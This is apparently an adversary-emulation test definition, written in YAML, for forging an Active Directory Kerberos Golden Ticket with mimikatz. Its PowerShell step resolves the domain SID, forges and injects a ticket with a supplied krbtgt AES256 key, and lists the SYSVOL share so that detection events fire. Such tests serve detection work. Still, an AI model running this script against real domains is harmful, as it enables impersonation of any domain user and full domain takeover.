api_version: "2.0"
name: Crafting Active Directory golden tickets with mimikatz
description: |
    Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
    This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
    The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
args:
    - name: domain_sid
      type: string
      default: S-1-5-21-DEFAULT
    - name: domain
      type: string
      default: '%userdnsdomain%'
    - name: account
      type: string
      default: goldenticketfakeuser
    - name: krbtgt_aes256_key
      type: string
      default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
    - name: mimikatz_path
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
uuid: 9726592a-dabc-4d4d-81cd-44070008b3af
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1558: Steal or Forge Kerberos Tickets'
    subtechniques:
        - 'T1558.001: Golden Ticket'
requirements:
    platforms:
        - os: windows
steps:
    - name: crafting-active-directory-golden-tickets-with-mimikatz
      inline: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"{{.Args.domain_sid}}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  {{.Args.mimikatz_path}} \"kerberos::golden /domain:{{.Args.domain}} /sid:DOMAIN_SID /aes256:{{.Args.krbtgt_aes256_key}} /user:{{.Args.account}} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\{{.Args.domain}}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
